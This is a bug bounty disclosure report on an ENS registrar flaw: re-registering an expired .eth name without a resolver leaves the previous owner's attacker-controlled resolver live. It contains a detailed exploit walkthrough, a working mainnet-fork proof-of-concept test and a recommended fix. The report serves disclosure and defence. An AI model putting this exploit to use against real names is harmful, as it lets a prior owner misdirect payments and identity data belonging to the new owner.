# Expired .eth re-registration without a resolver keeps an attacker-controlled stale resolver live for the new owner

Severity: Critical

Bounty Criteria Match: critical (smart contract): Unintended alteration of what the NFT represents (e.g. token URI, payload, artistic content)

Affected Assets / Contracts:

- `ETHRegistrarController` on mainnet at `0x59E16fcCd424Cc24e280Be16E11Bcd56fb0CE547`, especially [`register`](https://github.com/ensdomains/ens-contracts/blob/91c966febd7b55494269df830fc6775f040b927b/contracts/ethregistrar/ETHRegistrarController.sol#L247-L345)
- `BaseRegistrarImplementation` on mainnet at `0x57f1887a8BF19b14fC0dF6Fd9B2acc9Af147eA85`, especially [`_register`](https://github.com/ensdomains/ens-contracts/blob/91c966febd7b55494269df830fc6775f040b927b/contracts/ethregistrar/BaseRegistrarImplementation.sol#L130-L155)
- `ENSRegistry` on mainnet at `0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e`, especially [`setSubnodeOwner`](https://github.com/ensdomains/ens-contracts/blob/91c966febd7b55494269df830fc6775f040b927b/contracts/registry/ENSRegistry.sol#L75-L84), [`setRecord`](https://github.com/ensdomains/ens-contracts/blob/91c966febd7b55494269df830fc6775f040b927b/contracts/registry/ENSRegistry.sol#L33-L41), and [`resolver`](https://github.com/ensdomains/ens-contracts/blob/91c966febd7b55494269df830fc6775f040b927b/contracts/registry/ENSRegistry.sol#L137-L141)

## Executive Summary

An expired `.eth` name can be re-registered through the supported no-resolver registration path while keeping the previous registrant's resolver address in the ENS registry. The new buyer receives the ERC721 registration and becomes the ENS registry owner for the node, but the active resolver field remains the resolver chosen by the prior owner. If that resolver is controlled by the prior owner, the prior owner can keep changing the resolution payload for the newly owned name.

The attacker is an unprivileged previous registrant. They register a name with a resolver they control, set records, let the name expire, and wait for a later buyer to re-register the same label with `resolver == address(0)`. The vulnerable branch in `ETHRegistrarController.register` calls `BaseRegistrarImplementation.register` directly, and the base registrar updates only the subnode owner in the ENS registry. The resolver field is separate registry state and is not cleared.

This qualifies for the ENS Immunefi critical smart-contract impact row: "Unintended alteration of what the NFT represents (e.g. token URI, payload, artistic content)." For ENS names, the registry resolver is the pointer to the payload that users and integrations query to resolve addresses, contenthashes, text records, names, and related identity data. The PoC below demonstrates on a local mainnet fork that the victim owns the NFT and registry node after re-registration, yet the attacker-controlled resolver remains active and can be mutated by the attacker while the victim cannot update it through that resolver.

## Vulnerability Details

The broken invariant is: a successful registration should atomically set the registry owner and the resolver state to the values selected by the new registrant. If the new registrant selects no resolver, the resulting name should not inherit a resolver controlled by a prior owner.

The controller explicitly supports registrations with no resolver. The no-resolver branch is different from the resolver branch: it only calls `base.register(...)`, while the resolver branch calls `ens.setRecord(...)` to set both owner and resolver.

```solidity
if (registration.resolver == address(0)) {
    expires = base.register(
        uint256(labelhash),
        registration.owner,
        registration.duration
    );
} else {
    expires = base.register(
        uint256(labelhash),
        address(this),
        registration.duration
    );

    bytes32 namehash = keccak256(abi.encodePacked(ETH_NODE, labelhash));
    ens.setRecord(
        namehash,
        registration.owner,
        registration.resolver,
        0
    );
```

Source: [`ETHRegistrarController.register`](https://github.com/ensdomains/ens-contracts/blob/91c966febd7b55494269df830fc6775f040b927b/contracts/ethregistrar/ETHRegistrarController.sol#L287-L306)

`BaseRegistrarImplementation._register` burns the expired ERC721 if it still exists, mints the token to the new owner, and updates the ENS registry subnode owner. It does not set or clear the resolver field.

```solidity
expiries[id] = block.timestamp + duration;
if (_exists(id)) {
    // Name was previously owned, and expired
    _burn(id);
}
_mint(owner, id);
if (updateRegistry) {
    ens.setSubnodeOwner(baseNode, bytes32(id), owner);
}
```

Source: [`BaseRegistrarImplementation._register`](https://github.com/ensdomains/ens-contracts/blob/91c966febd7b55494269df830fc6775f040b927b/contracts/ethregistrar/BaseRegistrarImplementation.sol#L142-L150)

The ENS registry stores owner, resolver, and TTL as separate fields. `setSubnodeOwner` changes only `records[subnode].owner`; resolver and TTL are changed by `setRecord`, `setSubnodeRecord`, `setResolver`, or `_setResolverAndTTL`.

```solidity
function setSubnodeOwner(
    bytes32 node,
    bytes32 label,
    address owner
) public virtual override authorised(node) returns (bytes32) {
    bytes32 subnode = keccak256(abi.encodePacked(node, label));
    _setOwner(subnode, owner);
    emit NewOwner(node, label, owner);
    return subnode;
}
```

Source: [`ENSRegistry.setSubnodeOwner`](https://github.com/ensdomains/ens-contracts/blob/91c966febd7b55494269df830fc6775f040b927b/contracts/registry/ENSRegistry.sol#L75-L84)

This means the state transition for an expired name can become:

- Before expiry: `owner = attacker`, `resolver = attackerResolver`
- After no-resolver re-registration: `owner = victim`, `resolver = attackerResolver`

The victim can later replace the resolver by directly setting a resolver as the registry owner, but that is a manual recovery action after the name has already been issued in a misleading state. Until the victim notices and corrects it, normal ENS resolution follows the stale resolver.

## Attack Preconditions and Threat Model

The attacker is unprivileged. The attack does not require malicious or mistaken trusted/admin roles, leaked keys, compromised credentials, governance control, phishing, social engineering, deployment mistakes, or user approval misuse.

Required conditions:

1. The attacker previously registered a `.eth` label through the normal controller flow.
2. During that registration, the attacker set the name's resolver to a resolver contract they control. ENS permits arbitrary resolvers, and the PoC deploys a normal owner-controlled resolver in the local fork.
3. The registration expires and passes the registrar availability window. The PoC advances past the 28-day registration duration, 90-day grace period, and 28-day premium decay period for deterministic pricing.
4. A later buyer re-registers the same label using the supported no-resolver path, i.e. `registration.resolver == address(0)` with no data and no reverse record.

The buyer is not relying on a malicious wallet, compromised frontend, or invalid transaction. They are using an accepted controller input. The bug is that this input leaves stale resolver state from a previous owner attached to the newly issued name.

## Exploit Walkthrough

1. The attacker deploys or selects an attacker-controlled resolver. In the PoC this is `OwnedResolver`, whose record mutation authorization checks the resolver contract owner.
2. The attacker registers `staleresolverpocfork.eth` for 28 days through the deployed mainnet `ETHRegistrarController` on a local fork and supplies the attacker resolver as the name resolver.
3. The attacker sets the resolver's `addr(node)` record to the attacker's address. At this point the name is legitimately attacker-owned.
4. Time advances beyond the registration duration, the 90-day grace period, and the premium decay period. `ETHRegistrarController.available(label)` returns `true`.
5. The victim re-registers the same label through the controller with `resolver = 0x0000000000000000000000000000000000000000`.
6. The controller enters the no-resolver branch and calls `base.register(labelhash, victim, duration)`.
7. The base registrar burns/remints the ERC721 and calls `ens.setSubnodeOwner(.eth, labelhash, victim)`. This updates the registry owner but not the resolver field.
8. The resulting state is inconsistent: `BaseRegistrarImplementation.ownerOf(tokenId) == victim` and `ENSRegistry.owner(node) == victim`, but `ENSRegistry.resolver(node) == attackerResolver`.
9. The victim cannot update records through the attacker resolver because the resolver does not authorize the victim.
10. The attacker can still mutate the active resolver payload, for example changing `addr(node)` to a replacement address. Wallets, dapps, and integrations that resolve the name through the registry observe the attacker's payload even though the victim owns the name.

## Impact and Bounty Severity

ENS name ownership is represented by the registrar NFT and by the registry state that clients use for resolution. The resolver address is the active pointer to the name's payload. If it remains attacker-controlled after a new registration, the new owner's NFT/name can represent attacker-chosen address records, text records, contenthash records, or other resolver-supported payloads.

The demonstrated impact maps directly to the ENS Immunefi in-scope impact row: critical smart contract impact, "Unintended alteration of what the NFT represents (e.g. token URI, payload, artistic content)." The PoC shows an address-record payload alteration, but the same stale-resolver condition applies to any record type supported by the retained resolver.

The value at risk depends on the affected name and downstream usage. For a high-value ENS name, attacker-controlled resolution can misdirect payments, display wrong identity/profile data, or point users to attacker-chosen content. The exploit does not steal the NFT itself and does not permanently prevent the victim from correcting the resolver, but it issues the name in an attacker-controlled representation state immediately after a paid registration. Under the bounty's program-specific severity source of truth, that exact NFT representation alteration row is Critical.

Feasibility limits are clear and do not remove the impact: the attacker must be a previous registrant or otherwise have caused the stale resolver to exist, and the later buyer must use the no-resolver path. That path is explicitly supported by the controller, so this is not a user mistake or an out-of-scope integration failure.

## Proof of Concept

Save as: `test/ExpiredNameNoResolverReRegistrationPoC.test.ts`

Run: `MAINNET_RPC_URL=<mainnet rpc url> bun run test test/ExpiredNameNoResolverReRegistrationPoC.test.ts`

Expected result: the test passes; final assertions show the victim owns the `.eth` ERC721 and ENS registry node, the registry resolver remains the attacker-controlled resolver, the victim cannot mutate that resolver, and the attacker can change the live `addr` record.

Additional files: no new files are required beyond this test file. The PoC deploys the repository's existing `OwnedResolver` contract through the normal Hardhat artifact generated by `bun run test`.

```typescript
import hre from 'hardhat'
import { createAnvil } from '@viem/anvil'
import {
  type Address,
  type Hex,
  createPublicClient,
  createWalletClient,
  hexToBigInt,
  http,
  keccak256,
  labelhash,
  namehash,
  parseEther,
  toBytes,
  toHex,
  zeroHash,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { mainnet } from 'viem/chains'

// Fixed fork block keeps the PoC reproducible while still using deployed mainnet state.
const MAINNET_FORK_BLOCK = 25030187n
const REGISTRATION_DURATION = 28n * 24n * 60n * 60n
const GRACE_PERIOD = 90n * 24n * 60n * 60n
const PREMIUM_DECAY_PERIOD = 28n * 24n * 60n * 60n
const BASE_REGISTRAR = '0x57f1887a8BF19b14fC0dF6Fd9B2acc9Af147eA85'
const ETH_REGISTRAR_CONTROLLER =
  '0x59E16fcCd424Cc24e280Be16E11Bcd56fb0CE547'
const ENS_REGISTRY = '0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e'

/**
 * Well-known deterministic Hardhat/Anvil dev keys.
 *
 * These are public test keys, funded only inside the local Anvil fork with
 * anvil_setBalance below. They are not secrets and must never be used on
 * mainnet or any funded network.
 */
const attacker = privateKeyToAccount(
  '0x59c6995e998f97a5a0044966f0945389d78589786e8b1a1a0c35a0a1a16cd363',
)
const victim = privateKeyToAccount(
  '0x5de4111acf9a1971b0b2b092737e3a3a2c88c7b0d1b2e5f1e8b7e7b2f60e8f1b',
)
const replacement = privateKeyToAccount(
  '0x7c852118294bbba4a69d92112efb3e1a2b1d5d973250f0e0999d3da9e2cb4565',
)

const controllerAbi = [
  {
    type: 'function',
    name: 'rentPrice',
    stateMutability: 'view',
    inputs: [
      { name: 'label', type: 'string' },
      { name: 'duration', type: 'uint256' },
    ],
    outputs: [
      {
        name: 'price',
        type: 'tuple',
        components: [
          { name: 'base', type: 'uint256' },
          { name: 'premium', type: 'uint256' },
        ],
      },
    ],
  },
  {
    type: 'function',
    name: 'available',
    stateMutability: 'view',
    inputs: [{ name: 'label', type: 'string' }],
    outputs: [{ name: '', type: 'bool' }],
  },
  {
    type: 'function',
    name: 'minCommitmentAge',
    stateMutability: 'view',
    inputs: [],
    outputs: [{ name: '', type: 'uint256' }],
  },
  {
    type: 'function',
    name: 'makeCommitment',
    stateMutability: 'pure',
    inputs: [
      {
        name: 'registration',
        type: 'tuple',
        components: [
          { name: 'label', type: 'string' },
          { name: 'owner', type: 'address' },
          { name: 'duration', type: 'uint256' },
          { name: 'secret', type: 'bytes32' },
          { name: 'resolver', type: 'address' },
          { name: 'data', type: 'bytes[]' },
          { name: 'reverseRecord', type: 'uint8' },
          { name: 'referrer', type: 'bytes32' },
        ],
      },
    ],
    outputs: [{ name: '', type: 'bytes32' }],
  },
  {
    type: 'function',
    name: 'commit',
    stateMutability: 'nonpayable',
    inputs: [{ name: 'commitment', type: 'bytes32' }],
    outputs: [],
  },
  {
    type: 'function',
    name: 'register',
    stateMutability: 'payable',
    inputs: [
      {
        name: 'registration',
        type: 'tuple',
        components: [
          { name: 'label', type: 'string' },
          { name: 'owner', type: 'address' },
          { name: 'duration', type: 'uint256' },
          { name: 'secret', type: 'bytes32' },
          { name: 'resolver', type: 'address' },
          { name: 'data', type: 'bytes[]' },
          { name: 'reverseRecord', type: 'uint8' },
          { name: 'referrer', type: 'bytes32' },
        ],
      },
    ],
    outputs: [],
  },
] as const

const baseRegistrarAbi = [
  {
    type: 'function',
    name: 'ownerOf',
    stateMutability: 'view',
    inputs: [{ name: 'tokenId', type: 'uint256' }],
    outputs: [{ name: '', type: 'address' }],
  },
] as const

const ensRegistryAbi = [
  {
    type: 'function',
    name: 'owner',
    stateMutability: 'view',
    inputs: [{ name: 'node', type: 'bytes32' }],
    outputs: [{ name: '', type: 'address' }],
  },
  {
    type: 'function',
    name: 'resolver',
    stateMutability: 'view',
    inputs: [{ name: 'node', type: 'bytes32' }],
    outputs: [{ name: '', type: 'address' }],
  },
] as const

const resolverAbi = [
  {
    type: 'function',
    name: 'setAddr',
    stateMutability: 'nonpayable',
    inputs: [
      { name: 'node', type: 'bytes32' },
      { name: 'addr', type: 'address' },
    ],
    outputs: [],
  },
  {
    type: 'function',
    name: 'addr',
    stateMutability: 'view',
    inputs: [{ name: 'node', type: 'bytes32' }],
    outputs: [{ name: '', type: 'address' }],
  },
] as const

type Registration = {
  label: string
  owner: Address
  duration: bigint
  secret: Hex
  resolver: Address
  data: Hex[]
  reverseRecord: number
  referrer: Hex
}

const rpcUrl = process.env.MAINNET_RPC_URL
const anvil = createAnvil({
  forkUrl: rpcUrl,
  forkBlockNumber: MAINNET_FORK_BLOCK,
  chainId: 1,
  port: 18546,
  startTimeout: 60_000,
})

const publicClient = createPublicClient({
  chain: mainnet,
  transport: http(`http://${anvil.host}:${anvil.port}`),
})
const attackerWallet = createWalletClient({
  account: attacker,
  chain: mainnet,
  transport: http(`http://${anvil.host}:${anvil.port}`),
})
const victimWallet = createWalletClient({
  account: victim,
  chain: mainnet,
  transport: http(`http://${anvil.host}:${anvil.port}`),
})

async function mineAt(timestamp: bigint) {
  await publicClient.request({
    method: 'evm_setNextBlockTimestamp',
    params: [Number(timestamp)],
  } as never)
  await publicClient.request({ method: 'evm_mine', params: [] } as never)
}

async function wait(hash: Hex) {
  await publicClient.waitForTransactionReceipt({ hash })
}

async function fund(address: Address) {
  // Give local fork actors ETH for gas/registrations without touching mainnet.
  await publicClient.request({
    method: 'anvil_setBalance',
    params: [address, toHex(parseEther('10000'))],
  } as never)
}

// Registers through the deployed mainnet ETHRegistrarController, including
// the real commit/reveal delay and rentPrice calculation.
async function registerName(
  label: string,
  owner: Address,
  resolver: Address,
  secretText: string,
  accountWallet: typeof attackerWallet,
) {
  const registration: Registration = {
    label,
    owner,
    duration: REGISTRATION_DURATION,
    secret: keccak256(toBytes(secretText)),
    resolver,
    data: [],
    reverseRecord: 0,
    referrer: zeroHash,
  }
  const commitment = await publicClient.readContract({
    address: ETH_REGISTRAR_CONTROLLER,
    abi: controllerAbi,
    functionName: 'makeCommitment',
    args: [registration],
  })
  await wait(
    await accountWallet.writeContract({
      address: ETH_REGISTRAR_CONTROLLER,
      abi: controllerAbi,
      functionName: 'commit',
      args: [commitment],
    }),
  )

  const minCommitmentAge = await publicClient.readContract({
    address: ETH_REGISTRAR_CONTROLLER,
    abi: controllerAbi,
    functionName: 'minCommitmentAge',
  })
  const latestBlock = await publicClient.getBlock()
  await mineAt(latestBlock.timestamp + minCommitmentAge + 1n)

  const price = await publicClient.readContract({
    address: ETH_REGISTRAR_CONTROLLER,
    abi: controllerAbi,
    functionName: 'rentPrice',
    args: [label, REGISTRATION_DURATION],
  })
  await wait(
    await accountWallet.writeContract({
      address: ETH_REGISTRAR_CONTROLLER,
      abi: controllerAbi,
      functionName: 'register',
      args: [registration],
      value: price.base + price.premium,
    }),
  )
}

beforeAll(async () => {
  if (!rpcUrl) throw new Error('Set MAINNET_RPC_URL to run this fork PoC')
  // Start an isolated Ethereum mainnet fork. All writes below happen locally.
  await anvil.start()
  await fund(attacker.address)
  await fund(victim.address)
  await fund(replacement.address)
}, 90_000)

afterAll(async () => {
  await anvil.stop()
})

describe('ExpiredNameNoResolverReRegistrationPoC', () => {
  it('uses mainnet ENS contracts to show no-resolver re-registration keeps the old resolver', async () => {
    const label = 'staleresolverpocfork'
    const tokenId = hexToBigInt(labelhash(label))
    const node = namehash(`${label}.eth`)

    // A real user can deploy their own resolver; this is not a protocol mock.
    const resolverArtifact = await hre.artifacts.readArtifact('OwnedResolver')
    const deployHash = await attackerWallet.deployContract({
      abi: resolverArtifact.abi,
      bytecode: resolverArtifact.bytecode as Hex,
    })
    const deployReceipt = await publicClient.waitForTransactionReceipt({
      hash: deployHash,
    })
    const attackerResolver = deployReceipt.contractAddress!

    // The attacker uses a valid self-owned resolver when registering the name.
    await registerName(
      label,
      attacker.address,
      attackerResolver,
      'attacker-registration-secret',
      attackerWallet,
    )
    await wait(
      await attackerWallet.writeContract({
        address: attackerResolver,
        abi: resolverAbi,
        functionName: 'setAddr',
        args: [node, attacker.address],
      }),
    )
    expect(
      (
        await publicClient.readContract({
          address: attackerResolver,
          abi: resolverAbi,
          functionName: 'addr',
          args: [node],
        })
      ).toLowerCase(),
    ).toBe(attacker.address.toLowerCase())

    // Move past expiry, grace period, and premium decay so the same name is
    // normally available for a later buyer to re-register.
    const expiryBlock = await publicClient.getBlock()
    await mineAt(
      expiryBlock.timestamp +
        REGISTRATION_DURATION +
        GRACE_PERIOD +
        PREMIUM_DECAY_PERIOD +
        2n,
    )
    expect(
      await publicClient.readContract({
        address: ETH_REGISTRAR_CONTROLLER,
        abi: controllerAbi,
        functionName: 'available',
        args: [label],
      }),
    ).toBe(true)

    // A later buyer uses the supported no-resolver registration path.
    await registerName(
      label,
      victim.address,
      '0x0000000000000000000000000000000000000000',
      'victim-registration-secret',
      victimWallet,
    )

    expect(
      (
        await publicClient.readContract({
          address: BASE_REGISTRAR,
          abi: baseRegistrarAbi,
          functionName: 'ownerOf',
          args: [tokenId],
        })
      ).toLowerCase(),
    ).toBe(victim.address.toLowerCase())
    expect(
      (
        await publicClient.readContract({
          address: ENS_REGISTRY,
          abi: ensRegistryAbi,
          functionName: 'owner',
          args: [node],
        })
      ).toLowerCase(),
    ).toBe(victim.address.toLowerCase())
    expect(
      (
        await publicClient.readContract({
          address: ENS_REGISTRY,
          abi: ensRegistryAbi,
          functionName: 'resolver',
          args: [node],
        })
      ).toLowerCase(),
    ).toBe(attackerResolver.toLowerCase())

    // The victim owns the name, but the stale resolver is still controlled by
    // the prior owner, so the victim cannot update records through it.
    await expect(
      victimWallet.writeContract({
        address: attackerResolver,
        abi: resolverAbi,
        functionName: 'setAddr',
        args: [node, victim.address],
      }),
    ).rejects.toThrow()

    // The prior owner can still mutate the live resolution payload.
    await wait(
      await attackerWallet.writeContract({
        address: attackerResolver,
        abi: resolverAbi,
        functionName: 'setAddr',
        args: [node, replacement.address],
      }),
    )
    expect(
      (
        await publicClient.readContract({
          address: attackerResolver,
          abi: resolverAbi,
          functionName: 'addr',
          args: [node],
        })
      ).toLowerCase(),
    ).toBe(replacement.address.toLowerCase())
  })
})
```

## Recommended Fix

Make registration reset resolver state atomically whenever a new owner is issued a previously registered label.

The safest controller-level fix is to make the no-resolver branch mirror the resolver branch:

1. Register the name to the controller first.
2. Call `ens.setRecord(namehash, registration.owner, address(0), 0)` to set the new owner and clear the stale resolver and TTL.
3. Transfer the ERC721 from the controller to `registration.owner`.

Alternatively, update `BaseRegistrarImplementation._register` so that `updateRegistry == true` calls `ens.setSubnodeRecord(baseNode, bytes32(id), owner, address(0), 0)` instead of `ens.setSubnodeOwner(...)`, but assess compatibility for any controller that expects resolver preservation.

Add a regression test for an expired name that was previously registered with a custom owner-controlled resolver. After no-resolver re-registration, assert:

- `base.ownerOf(tokenId) == newOwner`
- `ens.owner(node) == newOwner`
- `ens.resolver(node) == address(0)`
- the prior resolver cannot affect resolution through the registry

The invariant to enforce is: after every successful registration, `ENSRegistry.resolver(node)` must equal the resolver requested by the new registration, including `address(0)` when no resolver is requested.

## References

- ENS Immunefi bounty rules: https://immunefi.com/bug-bounty/ens/information/
- ENS Immunefi scope: https://immunefi.com/bug-bounty/ens/scope/
- ENS Immunefi severity classification source: https://immunefi.com/immunefi-vulnerability-severity-classification-system-v2-3/
- ENS contracts repository at commit `91c966febd7b55494269df830fc6775f040b927b`: https://github.com/ensdomains/ens-contracts/tree/91c966febd7b55494269df830fc6775f040b927b
- [`ETHRegistrarController.register`](https://github.com/ensdomains/ens-contracts/blob/91c966febd7b55494269df830fc6775f040b927b/contracts/ethregistrar/ETHRegistrarController.sol#L247-L345)
- [`BaseRegistrarImplementation._register`](https://github.com/ensdomains/ens-contracts/blob/91c966febd7b55494269df830fc6775f040b927b/contracts/ethregistrar/BaseRegistrarImplementation.sol#L130-L155)
- [`ENSRegistry`](https://github.com/ensdomains/ens-contracts/blob/91c966febd7b55494269df830fc6775f040b927b/contracts/registry/ENSRegistry.sol#L7-L188)
- ENS README registry and resolver overview: https://github.com/ensdomains/ens-contracts/blob/91c966febd7b55494269df830fc6775f040b927b/README.md#registry
- PoC runtime assumption: local Ethereum mainnet fork at block `25030187`, using `MAINNET_RPC_URL` only as a fork source and never broadcasting live transactions
